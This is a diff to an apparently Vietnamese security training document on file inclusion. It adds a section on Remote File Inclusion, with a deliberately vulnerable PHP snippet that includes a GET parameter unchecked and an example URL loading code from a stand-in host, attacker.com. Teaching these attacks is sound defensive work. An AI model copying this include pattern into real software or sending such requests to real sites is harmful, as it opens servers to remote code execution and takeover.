@@ -114,7 +114,32 @@ Demo Notepad LFI: https://lfi-kcsc-training.glitch.me
 Source: [hypnguyen1209/demo-lfi](https://github.com/hypnguyen1209/demo-lfi)
 
 
-## 3. Tham khảo
+## 3.RFI
+Tương tự với LFI thì RFI  cho phép kẻ tấn công `include` và thực thi trên máy chủ nạm nhân 1 file được lưu trữ từ xa. 
+
+Hacker có thể sử dụng RFI để chạy một đoạn code trên cả máy của người dùng và phía máy chủ. 
+
+Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ.
+
+```
+http://example.com/index.php?page=test
+```
+
+```php
+<?php
+include $_GET['page'].'.php';
+?>
+
+```
+
+Như ví dụ LFI thay vì ta truyền tên file thì ta sẽ truyền đường dẫn chứ từ code của kẻ tấn công
+
+```
+http://example.com/index.php?page=http://attacker.com/exec
+```
+Khi người dùng truy cập thì lập tức mã độc trên sẽ được `include` thẳng vào code trên hệ thống vào gây là lỗi từ đó họ có thể chiếm quyền kiểm soát từ xa.
+
+## . Tham khảo
 https://securitydaily.net/tan-cong-file-inclusion/
 
 https://www.immuniweb.com/vulnerability/php-file-inclusion.html
